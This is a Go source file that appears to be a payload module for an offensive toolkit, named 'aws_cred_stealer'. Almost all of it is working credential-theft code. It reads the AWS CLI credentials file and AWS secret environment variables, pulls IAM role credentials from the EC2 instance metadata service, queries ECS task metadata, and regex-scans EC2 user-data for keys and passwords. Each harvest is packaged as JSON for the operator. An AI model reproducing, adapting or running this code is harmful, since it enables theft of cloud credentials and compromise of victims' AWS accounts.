package payloads

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

func init() {
	Register(&AWSCredStealer{})
}

type AWSCredStealer struct{}

func (a *AWSCredStealer) Name() string     { return "aws_cred_stealer" }
func (a *AWSCredStealer) Category() string { return "credential" }
func (a *AWSCredStealer) Description() string {
	return "Harvest AWS credentials from metadata endpoint, env vars, config files, disk"
}

func (a *AWSCredStealer) Execute(args map[string]string) ([]byte, error) {
	result := a.extract()
	return MarshalJSON(result)
}

type awsCredResult struct {
	Timestamp      string                 `json:"timestamp"`
	Credentials    map[string]interface{} `json:"credentials"`
	UserdataSecret map[string]interface{} `json:"userdata_secrets,omitempty"`
}

func (a *AWSCredStealer) extract() *awsCredResult {
	r := &awsCredResult{
		Timestamp:   time.Now().UTC().Format(time.RFC3339),
		Credentials: make(map[string]interface{}),
	}

	// 1. AWS CLI credentials file
	home, _ := os.UserHomeDir()
	credFile := filepath.Join(home, ".aws", "credentials")
	if data, err := os.ReadFile(credFile); err == nil {
		r.Credentials["cli_credentials"] = parseAWSCredentials(string(data))
	}

	// 2. Environment variables
	envCreds := make(map[string]string)
	for _, v := range []string{"AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_DEFAULT_REGION"} {
		if val := os.Getenv(v); val != "" {
			envCreds[v] = val
		}
	}
	if len(envCreds) > 0 {
		r.Credentials["environment"] = envCreds
	}

	// 3. EC2 Instance Metadata
	client := &http.Client{Timeout: 2 * time.Second}
	if imdsCreds := getEC2MetadataCredentials(client); len(imdsCreds) > 0 {
		r.Credentials["instance_metadata"] = imdsCreds
	}

	// 4. ECS metadata
	if uri := os.Getenv("ECS_CONTAINER_METADATA_URI"); uri != "" {
		resp, err := client.Get(uri + "/task")
		if err == nil {
			defer resp.Body.Close()
			data, _ := io.ReadAll(resp.Body)
			var parsed map[string]interface{}
			if json.Unmarshal(data, &parsed) == nil {
				r.Credentials["ecs_task"] = parsed
			}
		}
	}

	// 5. Lambda env detection
	lambdaVars := make(map[string]string)
	for _, v := range []string{"AWS_LAMBDA_FUNCTION_NAME", "AWS_LAMBDA_FUNCTION_VERSION", "_HANDLER"} {
		if val := os.Getenv(v); val != "" {
			lambdaVars[v] = val
		}
	}
	if len(lambdaVars) > 0 {
		r.Credentials["lambda"] = lambdaVars
	}

	// 6. Userdata check
	r.UserdataSecret = checkEC2Userdata(client)

	return r
}

func parseAWSCredentials(content string) map[string]interface{} {
	creds := make(map[string]interface{})
	re := regexp.MustCompile(`\[(.*?)\]([^[]+)`)
	matches := re.FindAllStringSubmatch(content, -1)

	for _, match := range matches {
		profileName := strings.TrimSpace(match[1])
		profileContent := strings.TrimSpace(match[2])
		profile := make(map[string]string)

		scanner := bufio.NewScanner(strings.NewReader(profileContent))
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if parts := strings.SplitN(line, "=", 2); len(parts) == 2 {
				profile[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}

		if len(profile) > 0 {
			creds[profileName] = profile
		}
	}
	return creds
}

func getEC2MetadataCredentials(client *http.Client) map[string]interface{} {
	result := make(map[string]interface{})

	// IMDSv2 token
	tokenURL := "http://169.254.169.254/latest/api/token"
	req, _ := http.NewRequest("PUT", tokenURL, nil)
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	tokBytes, _ := io.ReadAll(resp.Body)
	token := strings.TrimSpace(string(tokBytes))
	if token == "" {
		return nil
	}

	// Get IAM role
	roleURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	req, _ = http.NewRequest("GET", roleURL, nil)
	req.Header.Set("X-aws-ec2-metadata-token", token)
	resp, err = client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()
	roleData, _ := io.ReadAll(resp.Body)
	role := strings.TrimSpace(string(roleData))
	if role == "" {
		return nil
	}

	result["role_name"] = role

	// Get credentials for the role
	credURL := fmt.Sprintf("http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", role)
	req, _ = http.NewRequest("GET", credURL, nil)
	req.Header.Set("X-aws-ec2-metadata-token", token)
	resp, err = client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	credBytes, _ := io.ReadAll(resp.Body)
	var credData map[string]interface{}
	if json.Unmarshal(credBytes, &credData) == nil {
		for k, v := range credData {
			result[k] = v
		}
	}

	return result
}

func checkEC2Userdata(client *http.Client) map[string]interface{} {
	result := make(map[string]interface{})
	req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/user-data", nil)
	req.Header.Set("X-aws-ec2-metadata-token", "required")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(resp.Body)
	if len(data) == 0 {
		return nil
	}

	patterns := map[string]*regexp.Regexp{
		"aws_access_key": regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
		"aws_secret_key": regexp.MustCompile(`[0-9a-zA-Z/+]{40}`),
		"password":       regexp.MustCompile(`(?i)password[=:]\s*(\S+)`),
		"api_key":        regexp.MustCompile(`(?i)api[_-]?key[=:]\s*(\S+)`),
	}
	content := string(data)
	for name, re := range patterns {
		matches := re.FindAllString(content, 3)
		if len(matches) > 0 {
			result[name] = matches
		}
	}
	return result
}
